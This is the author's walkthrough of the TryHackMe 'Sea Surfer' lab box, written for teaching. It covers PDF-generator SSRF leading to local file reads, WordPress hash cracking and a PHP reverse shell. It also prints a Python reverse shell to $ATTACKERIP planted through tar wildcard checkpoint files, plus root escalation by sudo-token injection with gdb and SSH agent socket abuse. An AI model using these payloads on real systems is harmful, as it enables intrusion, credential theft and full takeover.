# Sea Surfer Official Writeup

![](attachments/Pasted%20image%2020220421182735.png)

## Info
https://tryhackme.com/room/seasurfer

First ever **TryHackMe** room, made by yours truly!

Inspiration for the box's foothold was a real-world pentest, where I managed to read files from the server with the exact same `PDF SSRF redirection to LFI` - exploit.

I love **TryHackMe**, since it's the place where I first started to learn about infosec, but they were missing this particular vulnerability so I decided to make a room for it myself.

Without further ado, let's get our walkthrough roleplay on:

## Initial enumeration
Let's launch the machine and wait at least 5 minutes for it to fully boot up.

For the first order of business, we will run an `nmap` scan to enumerate the open ports and services on the machine:

```zsh
lassi@kali:~$ sudo nmap -A -p- -T4 -v $TARGETMACHINEIP
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host 
```

A pretty standard **Ubuntu Linux** server running `ssh` on port **22** and an `Apache` webserver on port **80**. Searching for the `Apache` version didn't return any low-hanging vulnerabilities, so let's do some manual enumeration. Navigating to the **IP** address in our browser returns the **Apache2 Ubuntu Default Page**:

![Pasted image 20220419095152.png](attachments/Pasted%20image%2020220419095152.png)

The `HTML` source code didn't return any credentials or other details, which is common in Capture-the-Flags. Let's quickly run `gobuster` with the quick `common.txt` to try to bruteforce any hidden or interesting directories:

```zsh
lassi@kali:~$ gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt dir -u http://$TARGETMACHINEIP/  
...
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]  
...
```

Nothing good. At this point it's good to remember a part of our methodology, which is to run all manual web enumeration through **Burp Proxy** to build a site map and easily check the `HTTP` request/response pairs. There's something interesting in the response to the `GET` request for the site index:

```http
HTTP/1.1 200 OK
Date: Tue, 19 Apr 2022 06:50:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Length: 10918
Connection: close
Content-Type: text/html
```

An `X-Backend-Server` header, which gives us a hostname to work with! Researching [online](https://www.zaproxy.org/docs/alerts/10039/) indicates it to be a misconfiguration. In any case, let's add that to our `/etc/hosts`:

```zsh
lassi@kali:~$ echo "$TARGETMACHINEIP seasurfer.thm" | sudo tee -a /etc/hosts
```

Now when navigating to the hostname, a different site appears:

![Pasted image 20220419100934.png](attachments/Pasted%20image%2020220419100934.png)

It seems to be a **WordPress** site about a surfer shop in Los Angeles. Employees are listed on the about page, which gives us possible usernames:

![Pasted image 20220419101352.png](attachments/Pasted%20image%2020220419101352.png)

We're probably mostly interested in **Kyle**, as they are the company's sysadmin and have also made the site, as indicated by the "Made by kyle! <3" in the site's footer. Let's run `wpscan` to automatically enumerate the site's plugins, backup configs, and users (specified in the `-e` switch):

```zsh
lassi@kali:~$ wpscan --url http://seasurfer.thm/ --api-token <redacted> -e ap, cb, u
```

There was really nothing exciting found, apart from a plugin `XSS` vulnerability which requires admin privileges. Otherwise it seems to be a pretty up to date default **Wordpress** installation. How about running `gobuster` again, this time with a bigger `big.txt` wordlist, maybe this virtual host could have some hidden directories?

```zsh
lassi@kali:~$ gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt dir -u http://seasurfer.thm/ 
...
/adminer              (Status: 301) [Size: 316] [--> http://seasurfer.thm/adminer/]
...
```

Nothing really all that interesting found, except for the `/adminer/` directory! Let's see what it is:

![](attachments/Pasted%20image%2020220615035351.png)

Researching online it seems to be an alternative to the common `MySQL` admin panel `phpMyAdmin`. No known vulnerabilities were found for version **4.8.1** , but let's keep this find in our notes for later. For now, let's try to comb through the site manually. The blog posts are always a good place to start:

![Pasted image 20220419102318.png](attachments/Pasted%20image%2020220419102318.png)

**Sea Surfer** is apparently going to update their site to have an online shop soon. Even more interestingly, under the blog post, there is a comment by **brandon**:

![Pasted image 20220419102501.png](attachments/Pasted%20image%2020220419102501.png)

The comment would indicate an employee-only subdomain, where they can create receipts for customers. Maybe **Brandon** just simply misspelled the subdomain from *internal* to *intrenal*? Let's add it to our `hosts` file and try to visit the subdomain:

```zsh
lassi@kali:~$ echo "$TARGETMACHINEIP internal.seasurfer.thm" | sudo tee -a /etc/hosts
```

![Pasted image 20220420145134.png](attachments/Pasted%20image%2020220420145134.png)

It works! We're met with a pretty oldschool-looking `HTML` input form for a customer order. Inputting bogus values and pressing '**Create receipt**' generates a `PDF` and redirects us to it:

![Pasted image 20220423014552.png](attachments/Pasted%20image%2020220423014552.png)

## Exploitation
**NahamSec** [once said](https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent) this:

>If you see a PDF generator somewhere, 9/10 it’s vulnerable

The linked presentation slides are a great intro and cheatsheet into `PDF` generator vulnerabilities. Basically, many `HTML` -> `PDF` generators by default parse user input strings as `HTML`, including `Javascript` ! This spawns a nasty vulnerability where `XSS` isn't client-side anymore, but is executed on the server, which can often be leveraged into `SSRF` (**Server-Side Request Forgery**).

For a proof of concept, let's try to inject some `HTML` into the comment field while filling in the rest of the fields with bogus values:

```html
<img src=x onerror=document.write(1337)>
```
 
The payload parts:

| Syntax      | Description |
| ----------- | ----------- |
| `<img`      | `HTML` image tag       |
| `src=x`   | Source for the image, pointing to a non-existing resource        |
| `onerror=document.write(1337)`   | `Javascript`. If image cannot be loaded, write the number **1337** to the page         |
| `>`   | `HTML` closing tag         | 


![Pasted image 20220420145217.png](attachments/Pasted%20image%2020220420145217.png)

Now if the `PDF` generator is vulnerable, we should get back a `PDF` file containing the number **1337**:

![Pasted image 20220419113417.png](attachments/Pasted%20image%2020220419113417.png)

Heureka! The concept has been proven. How about forging external requests? The presentation linked earlier goes through it as well. First, we should start a `netcat` listener on a chosen port, like **1234**:

```zsh
lassi@kali:~$ nc -lvnp 1234
listening on [any] 1234 ...
```

Now, let's go through the same steps as in the initial **PoC**, but have the payload as this:

```html 
<iframe src="http://$ATTACKERIP:1234/> 
```

Hooray, we receive a connection in the form of a `HTTP` request:

```zsh
connect to [$ATTACKERIP] from (UNKNOWN) [$TARGETMACHINEIP] 49508
GET /%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%20class= HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://internal.seasurfer.thm/invoice.php?name=lassi&payment=Credit+card&comment=%3Ciframe+src%3D%22http%3A%2F%2F$ATTACKERIP%3A1234%2F%3E&item1=bogus&price1=999&id=19042022-8pTP7gaajWwf7SJfcb9A
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: $ATTACKERIP:1234
```

If we were not in CTF land, we could try to abuse the link-local address `169.254.169.254` to perhaps gain access to the cloud metadata and other sensitive information, like [this](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html). But for **TryHackMe**, that's out of scope.

How about accessing internal files from the server, leveraging the initial server-side `XSS` to `SSRF` to `LFI`?

`<iframe>` tags should support the `file://` **URI scheme**. Let's try this payload:

```html 
<iframe src="file:///etc/passwd"> 
```

Damn. Dead end.

![Pasted image 20220423014719.png](attachments/Pasted%20image%2020220423014719.png)

After trying most of the techniques from [**@NahamSec**](https://twitter.com/NahamSec) & [**@Daeken**](https://twitter.com/Daeken)'s [presentation](https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent) without success, it's time for us to try something else. First, what's the `PDF` generator used here, and what version? The generator's name, `wkhtlmtopdf`, was visible in the `User-Agent` header we received earlier in the `netcat` listener. To get the version, we can try looking through the downloaded `PDF` metadata:

```zsh
lassi@kali:~$ pdfinfo 19042022-7DWlUOBB8cX3YaqfQK1b.pdf                    
Title:           Receipt
Creator:         wkhtmltopdf 0.12.5
Producer:        Qt 4.8.7
...
```

Let's research a bit by googling some of these keywords: "**wkhtmltopdf**" "**ssrf**" "**xss**" "**lfi**".

We come across these great three links:

https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570

https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/

http://hassankhanyusufzai.com/SSRF-to-LFI/

It seems as though by default `wkhtmltopdf` doesn't properly check if a redirection is happening to a local file, and fetches it. Let's construct a diagram of this happening:

![](attachments/Pasted%20image%2020220620222412.png)

This seems to be fixed in the most recent release of `wkhtmltopdf`, as indicated in the [release notes](https://github.com/wkhtmltopdf/wkhtmltopdf/releases/tag/0.12.6) for **0.12.6**: 

> -   **[#4536](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536)**: BREAKING CHANGE: block local filesystem access by default

However, according to the metadata the version on the server is **0.12.5**, so let's try to exploit the vulnerability. We will need a functional `PHP` server, and as we are elite hackers, we of course have a `LAMP` stack already running. We will host this payload code as `surf.php`:

```php
<?php
$loc = "http://127.0.0.1/"; if(isset($_GET['p'])){ $loc = $_GET['p']; } header('Location: '.$loc);
?>
```

A simple `php -S 0.0.0.0:80` command would also suffice to host the `PHP` file. We can't use the usual `python -m http.server`, because then our code wouldn't execute. We could also do this with straight up `netcat` by manually entering the `HTTP` response every time, but it's very tedious:

```http
HTTP/1.1 301 Moved Permanently
Location: file:///foo/bar
```

Now, to try the redirection vulnerability in practice, we input the following payload into the receipt generator same as before:

```html
<iframe height=3000 src="http://$ATTACKERIP/surf.php?p=file:///etc/passwd">
```

![Pasted image 20220423015026.png](attachments/Pasted%20image%2020220423015026.png)

Great success!

Now that we have a way to read files on the server, on to enumeration. Seeing as the `wkhtmltopdf` command most likely runs as the `www-data` user, we're very limited as to what we can read. However, it's always a good bet to start at the `/var/www/` directory, since there we should have close to full access and very often web application database credentials are hardcoded into the configuration files.

A very common example of such behaviour is **WordPress** that by default has the database credentials input into `wp-config.php` - and as we know, there is an instance of that running on the server. Furthermore, we also found the `/adminer/` directory, where we could log into the `SQL` server.

After a bit of trial, error, blood, and sweat with the `SSRF` -> `LFI` vulnerability, we found the **WordPress** configuration file at `/var/www/wordpress/wp-config.php`:

![Pasted image 20220419130226.png](attachments/Pasted%20image%2020220419130226.png)

Now that we have the database credentials, let's log in via the previously found **Adminer** panel at `http://seasurfer.thm/adminer/`:

![](attachments/Pasted%20image%2020220617151534.png)

We have two options here - Either add a new admin user to **WordPress**, or try to crack the existing admin's password. Since the password appears to be `phpass` hashed, which is a very weak algorithm, let's try option 2: cracking.

![Pasted image 20220419132822.png](attachments/Pasted%20image%2020220419132822.png)

```zsh
lassi@kali:~$ echo '$P$BuCryp52<redacted>/' > kyle_wp.hash

lassi@kali:~$ john -w=/usr/share/wordlists/rockyou.txt kyle_wp.hash
...
<redacted>       (?)     
1g 0:00:00:08 DONE (2022-04-19 13:31) 0.1226g/s 61534p/s 61534c/s 61534C/s jess0107..jello33
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

It took us a whopping 8 seconds, and our **Kali** machine isn't even that beefy! **Kyle** should really use a password manager. In any case, now that we have the credentials, let's log in to **WordPress** via the default `/wp-admin` endpoint:

![Pasted image 20220419133823.png](attachments/Pasted%20image%2020220419133823.png)


Instead of defacing the website or doing anything nasty to their customers, let's get a reverse shell going. **WordPress** is almost notorius for it's (admin) **RCE** capability by default. Some people use `metasploit` for this, but we'll do it manually by uploading the classic **PentestMonkey PHP reverse shell** to the `404` page via **Appearance -> Theme File Editor -> 404 Template**. Let's save and visit any non-existing page, such as `http://seasurfer.thm/wowwhatagreatbox` to activate the reverse shell in the `404` template:

```zsh
lassi@kali:~$ nc -lvnp 1234        
listening on [any] 1234 ...
connect to [$ATTACKERIP] from (UNKNOWN) [$TARGETMACHINEIP] 49566
Linux seasurfer 5.4.0-107-generic #121-Ubuntu SMP Thu Mar 24 16:04:27 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 10:44:44 up  2:40,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kyle     pts/0    127.0.0.1        08:06    2:38m  0.00s  0.00s sleep infinity
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (744): Inappropriate ioctl for device
bash: no job control in this shell
www-data@seasurfer:/$ 
```

![Pasted image 20220419134616.png](attachments/Pasted%20image%2020220419134616.png)

## Privilege escalation

As we're still the `www-data` user, there's not much we can do - our access is mostly limited to the webserver directory and the usual **Linux** files available to the whole system. Now is a good time to fully enumerate the `/var/www/` directory we do have (mostly) full access to - and there we find something juicy:

```zsh
www-data@seasurfer:/var/www/internal/maintenance$ ls
backup.sh
www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# TODO investigate the reason for the downtime. Need a debugger...

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
```

Ah, a backup script with a wildcard, a privescer's bread and butter. Judging from the comments, it's running every minute, probably in `kyle`'s crontab. Unfortunately the script isn't writable by the `www-data` user, but here's where the wildcard comes to play.

In `bash`, the wildcard `*` expands to all of the files in the specified directory. A command such as `rm *` in a directory with files `foo` and `bar` would be executed as `rm foo bar`.

Now, some programs, such as `tar` or `rsync`, which are often used for backup commands, have command-line switches that can execute files. Specifically in `tar`, there are [**checkpoint** switches](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) that can execute commands at certain parts of the runtime. Now, what would happen if a wildcard was used and some of the files in that directory were named with the `--checkpoint` syntax? Let's see.

Since we have write privileges at `/var/www/internal/invoices/`, we can introduce some checkpoints files that execute a reverse shell script:

```zsh
www-data@seasurfer:/var/www/internal/maintenance$ cd ../invoices
www-data@seasurfer:/var/www/internal/invoices$ echo $'/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ATTACKERIP\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\'' > shell.sh
www-data@seasurfer:/var/www/internal/invoices$ echo "" > "--checkpoint-action=exec=sh shell.sh"
www-data@seasurfer:/var/www/internal/invoices$ echo "" > --checkpoint=1
```

Now the `cronjob` running every minute should execute as such:

```zsh
tar -zcf /home/kyle/backups/invoices.tgz --checkpoint=1 '--checkpoint-action=exec=sh shell.sh' receipt1.pdf receipt2.pdf 
```

After we wait for a minute, a shell pops into our listener:

```zsh
lassi@kali:~$ nc -lvnp 1337  
listening on [any] 1337 ...
connect to [$ATTACKERIP] from (UNKNOWN) [$TARGETMACHINEIP] 55564
$ whoami
kyle
$ cat /home/kyle/user.txt
THM{REDACTED}
```

Great. First things first, let's get away from this horrible pseudoterminal reverse shell.

(pending an update of the box in THM - as of now, just input your own key into authorized_keys)
**Kyle** seems to have left an `SSH` private "testkey" in their `.ssh` folder - and we can use it to `SSH` into the box as `kyle`.

Afterwards, it's probably best to remove the wildcard payloads to keep the machine from spawning multiple reverse shells which freeze, as this will likely kill the server's performance over enough time. 

### root, method 1

Running our favourite enumeration script **LinPEAS** didn't catch any low hanging fruits such as `SUID` files or editable `root cronjobs`. However, there are a few of things that caught our attention.

First, there is a weird `sudo` command running:

```zsh
kyle        1033  0.0  0.2   6892  2348 pts/0    Ss+  08:06   0:00 bash -c sudo /root/admincheck; sleep infinity
```

Second, `kyle` is in the `sudo` group, but we don't know the password:

```zsh
kyle@seasurfer:~$ groups
kyle adm cdrom sudo dip www-data plugdev
kyle@seasurfer:~$ sudo -l
[sudo] password for kyle:
```

Third, **LinPEAS** has identified something called `ptrace protection` as disabled, which has something to do with `sudo` tokens:

```
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
```

As we read through the **HackTricks** [link](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens) and subsequently the [git repo](https://github.com/nongiach/sudo_inject), it seemed something worth trying. It's not fully clear to us yet, but **Linux** systems with `ptrace` fully enabled allows the observation of the same user's `sudo` tokens, which are reusable for a certain amount of time. Let's look at the requirements:

| Requirement      | Fulfilled? |
| ----------- | ----------- |
| Have a shell on the user   | Yes        |
| `ptrace` fully enabled      | Yes (`/proc/sys/kernel/yama/ptrace_scope == 0`)       |
| User has used `sudo` and has an active token in another session   | Maybe? (judging by the running processes)        |
| `gdb` must be accessible   | No, but perhaps we can upload it?        |

Reading up on `ptrace` in the following links \[[1](https://www.kernel.org/doc/Documentation/security/Yama.txt)\]\[[2](https://man7.org/linux/man-pages/man2/ptrace.2.html)\]\[[3](https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/)\] explained the concept a bit:

* `ptrace` is a very aptly named **Linux** system call and a debugging tool which allows to observe and _trace_ how a _process_ runs in the operating system
* However, this can be abused, since many processes contain secrets and sensitive information (such as `sudo` tokens)
* **Yama** is a **Linux Security Module** that aims to fix this by setting a scope for the processes that can be observed with `ptrace` 
* If the **Yama** `ptrace_scope` is set to **0**, the protection is disabled, which allows the observation of all processes

We need the `gdb` program, which is a debugger for `C`, to be able to use the `ptrace` system call properly. The `sudo_inject` [git repo](https://github.com/nongiach/sudo_inject) includes a standalone binary, but it doesn't work on the server (incompatible dependencies?):

```zsh
kyle@seasurfer:/tmp/sudo_inject/extra_tools$ ./gdb-7.10.1-x64 --help
gdb-7.10.1-x64: loadlocale.c:129: _nl_intern_locale_data: Assertion `cnt < (sizeof (_nl_value_type_LC_TIME) / sizeof (_nl_value_type_LC_TIME[0]))' failed.
Aborted (core dumped)
```

Luckily, it's not an issue. The `.deb` files one can install via `apt` or `dpkg` are actually just file archives that can be extracted to find a working binary inside. We shall download the right `.deb` from the **Ubuntu** repos for the appropriate distro on the target machine (**Ubuntu 20.04 Focal Foss**). [Link](https://packages.ubuntu.com/focal/amd64/gdb/download)

Once transferred on the target machine, let's extract it and see if it runs, and if it does, add it to our `PATH`:

```zsh
kyle@seasurfer:/tmp/gdb$ ls
gdb_9.1-0ubuntu1_amd64.deb
kyle@seasurfer:/tmp/gdb$ ar x gdb_9.1-0ubuntu1_amd64.deb 
kyle@seasurfer:/tmp/gdb$ tar -xf data.tar.xz
kyle@seasurfer:/tmp/gdb$ cd usr/bin/
kyle@seasurfer:/tmp/gdb/usr/bin$ ./gdb
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
...
(gdb) Quit
kyle@seasurfer:/tmp/gdb/usr/bin$ export PATH=$(pwd):$PATH
```

Now we should have all of the prerequisites for the exploits met. 

(sidenote, do not use the `exploit.sh` from the [sudo_inject git repo](https://github.com/nongiach/sudo_inject). For whatever reason, the `activate_sudo_token` binary seems to corrupt shell processes on a random chance - if anyone is able to figure it out, please contact me)

Now all what's left for us to do is fire away the `exploit_v2.sh` script, hoping for the best!

```zsh
kyle@seasurfer:~$ sh exploit_v2.sh 
Creating suid shell in /tmp/sh
Current process : 16965
Injecting process 845 -> bash
Injecting process 1313 -> sh
Injecting process 1321 -> sh
Injecting process 1344 -> bash
Sorry, try again.
cat: /proc/16966/comm: No such file or directory
Injecting process 16966 -> 
kyle@seasurfer:~$ ls -lpah /tmp/sh
-rwsr-sr-x 1 root root 127K Jun 23 21:44 /tmp/sh
kyle@seasurfer:~$ /tmp/sh -p
# whoami
root
# cat /root/root.txt
THM{REDACTED}
```

Success! After reading the exploit code, it became clear that it's in fact really simple to exploit manually as well. It's just getting the **PIDs** of the running shell processes, attaching to them one by one with `gdb`, and echoing a `sudo` payload with a `system()` call.

We just need the `gdb` binary and the **PID** of a shell where the `sudo` token is active:

```zsh
# attach gdb to the shell process with an active sudo token with -p switch
kyle@seasurfer:~$ gdb -q -n -p 1032
Attaching to process 1032
...
# now we can issue sudo commands with the system call, example:
(gdb) call system("echo | sudo -S chmod +s /bin/bash 2>&1")
...
(gdb) quit
A debugging session is active.

	Inferior 1 [process 1032] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/bash, process 1032
[Inferior 1 (process 1032) detached]
kyle@seasurfer:~$ ls -lpah /bin/bash
-rwsr-sr-x 1 root root 1.2M Jun 18  2020 /bin/bash
kyle@seasurfer:~$ /bin/bash -p
bash-5.0# whoami
root
```

### root, method 2
After some enumeration on the box, we found out that **PAM** for `sudo` has been configured to accept `SSH` keys:

```zsh
kyle@seasurfer:~$ cat /etc/pam.d/sudo
#%PAM-1.0

auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0
@include common-auth
@include common-account
@include common-session-noninteractive
```

Furthermore, **Kyle** has `ssh`'d into the box and used `sudo`:

```zsh
kyle@seasurfer:~$ ps aux
...
kyle        1059  0.0  0.3  13920  3256 ?        S    14:36   0:00 sshd: kyle@pts/0
kyle        1060  0.0  0.2   6892  2036 pts/0    Ss+  14:36   0:00 bash -c sudo /root/admincheck; sleep infinity
...
```

Finally, we found an `SSH` agent socket file for the shell process we can access:

```zsh
kyle@seasurfer:~$ ls -lpah /tmp/ssh-I2y4KwPuPD/agent.1059 
srwxrwxr-x 1 kyle kyle 0 Jun 18 14:36 /tmp/ssh-I2y4KwPuPD/agent.1059
```

After reading up a bit on `pam_ssh_agent_auth` [here](https://manpages.ubuntu.com/manpages/bionic/man8/pam_ssh_agent_auth.8.html), we understood that all we have to do is add the `SSH_AUTH_SOCK` and location to our environment variable and **PAM** would let us use `sudo`:

```zsh
kyle@seasurfer:~$ export SSH_AUTH_SOCK=/tmp/ssh-I2y4KwPuPD/agent.1059
kyle@seasurfer:~$ ssh-add -l
3072 SHA256:boZASmxRncp8AM+gt1toNuZr9jh1dyatwf9DPZYit88 kyle@seasurfer (RSA)
kyle@seasurfer:~$ sudo -l
Matching Defaults entries for kyle on seasurfer:
    env_keep+=SSH_AUTH_SOCK, env_reset, timestamp_timeout=420, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kyle may run the following commands on seasurfer:
    (ALL : ALL) ALL
kyle@seasurfer:~$ sudo -s
root@seasurfer:/home/kyle# cat /root/root.txt
THM{REDACTED}
```

(this was originally an unintended path, found by [onurshin](https://tryhackme.com/p/onurshin). Decided to keep it, since it's pretty hard to find)

## End

That's it! Submit the flags and complete the room. Hope you enjoyed it! :)

Extra credit: How were the processes of `ssh`'ing to `kyle` from `root` hidden from `ps aux`?
Extra credit 2: How did the `SSHtoserver.sh` script use `sudo` on the server without supplying `kyle`'s' password? This is related to onurshin's find!

Credits for the images and some code are in `/root/credits.txt`